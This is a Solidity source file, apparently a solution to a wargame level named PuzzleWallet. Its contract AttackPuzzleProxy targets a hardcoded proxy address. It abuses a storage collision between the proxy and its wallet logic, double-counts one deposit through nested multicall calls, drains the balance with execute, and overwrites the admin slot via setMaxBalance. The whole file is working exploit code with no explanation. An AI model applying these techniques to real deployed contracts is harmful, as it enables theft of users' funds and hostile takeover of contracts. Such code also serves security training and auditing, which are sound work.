// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface PuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
}

interface PuzzleWallet {
    function addToWhitelist(address addr) external;

    function multicall(bytes[] memory data) external payable;

    function execute(address to, uint256 value, bytes calldata data) external payable;

    function deposit() external payable;

    function setMaxBalance(uint256 _maxBalance) external;
}

contract AttackPuzzleProxy {
    PuzzleProxy proxyContract =   PuzzleProxy(0x390df5c5680248ED533aa598C9d66E6C874fe3Ea);
    PuzzleWallet puzzleContract = PuzzleWallet(0x390df5c5680248ED533aa598C9d66E6C874fe3Ea);

    function solve() public payable {
        proxyContract.proposeNewAdmin(address(this));

        puzzleContract.addToWhitelist(address(this));

        bytes[] memory depositCallData = new bytes[](1);
        depositCallData[0] = abi.encodeWithSelector(
            puzzleContract.deposit.selector
        );

        bytes[] memory initialMulticallData = new bytes[](2);

        initialMulticallData[0] = abi.encodeWithSelector(
            puzzleContract.multicall.selector,
            depositCallData
        );
        initialMulticallData[1] = abi.encodeWithSelector(
            puzzleContract.multicall.selector,
            depositCallData
        );

        require(
            msg.value == 0.001 ether,
            "Need to send 0.001 ether when making this transaction"
        );
        puzzleContract.multicall{value: 0.001 ether}(initialMulticallData);

        puzzleContract.execute(msg.sender, 0.002 ether, "");

        puzzleContract.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
